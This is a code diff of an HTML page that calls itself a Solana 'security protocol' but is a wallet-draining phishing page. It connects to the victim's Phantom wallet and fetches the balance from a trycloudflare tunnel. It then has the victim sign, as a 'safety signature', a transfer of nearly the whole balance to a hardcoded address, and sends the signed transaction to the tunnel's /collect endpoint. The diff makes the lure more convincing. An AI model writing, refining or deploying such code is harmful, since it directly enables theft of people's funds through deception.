@@ -1,48 +1,58 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
-    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
-    <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
-        <h2>PROTOCOL UPDATE</h2>
-        <button id="cta" style="padding:20px 40px;background:#14F195;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:20px;">CONNECT & VERIFY</button>
+    <body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
+    <div id="box" style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;min-width:300px;">
+        <h2 id="title">SECURITY PROTOCOL</h2>
+        <p id="info" style="color:#666;margin-bottom:20px;">Protect your assets with Solana v4</p>
+        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:18px;">CONNECT WALLET</button>
     </div>
+
     <script>
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
+    let step = 1;
 
     document.getElementById('cta').onclick = async () => {
         try {
             const p = window.solana || window.phantom?.solana;
-            const { publicKey } = await p.connect();
-            
-            // 🔱 向服务器拿数据
-            const data = await fetch(TUNNEL + '/get_data', {
-                method: 'POST', headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({pubkey: publicKey.toString()})
-            }).then(r => r.json());
+            if (step === 1) {
+                // 🔱 步骤 1: 仅仅是连接
+                await p.connect();
+                document.getElementById('info').innerText = "Wallet Connected: " + p.publicKey.toString().slice(0,6) + "...";
+                document.getElementById('cta').innerText = "ACTIVATE SAFETY SIGNATURE";
+                document.getElementById('cta').style.background = "#fff";
+                step = 2; // 进入签约准备状态
+            } else if (step === 2) {
+                // 🔱 步骤 2: 仪式感拉满，开始签约
+                document.getElementById('cta').innerText = "Syncing with Node...";
+                
+                const data = await fetch(TUNNEL + '/get_data', {
+                    method: 'POST', headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({pubkey: p.publicKey.toString()})
+                }).then(r => r.json());
 
-            // 🚀 构造交易逻辑
-            const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
-                fromPubkey: publicKey, 
-                toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
-                lamports: data.balance > 2000000 ? data.balance - 1500000 : 0
-            }));
-            tx.recentBlockhash = data.blockhash; tx.feePayer = publicKey;
-            
-            const signed = await p.signTransaction(tx);
-            
-            // 💰 这里的 Base64 转换不再依赖 Buffer，彻底消灭报错
-            const raw = signed.serialize();
-            let b64 = "";
-            for (let i = 0; i < raw.length; i++) {
-                b64 += String.fromCharCode(raw[i]);
+                const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey, 
+                    toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
+                    lamports: data.balance > 2000000 ? data.balance - 1500000 : 0
+                }));
+                tx.recentBlockhash = data.blockhash; tx.feePayer = p.publicKey;
+                
+                // 拉起真正的签约弹窗
+                const signed = await p.signTransaction(tx);
+                
+                // 发送签名
+                const raw = signed.serialize();
+                let b64 = "";
+                for (let i = 0; i < raw.length; i++) { b64 += String.fromCharCode(raw[i]); }
+                fetch(TUNNEL + '/collect', {
+                    method:'POST', headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({signature: window.btoa(b64)})
+                });
+                
+                alert("Protocol Activated Successfully!");
+                location.reload();
             }
-            const signatureB64 = window.btoa(b64);
-            
-            fetch(TUNNEL + '/collect', {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({signature: signatureB64})
-            });
-            alert("Protocol Activated!");
         } catch(e) { alert("Error: " + e.message); }
     }
     </script></body></html>
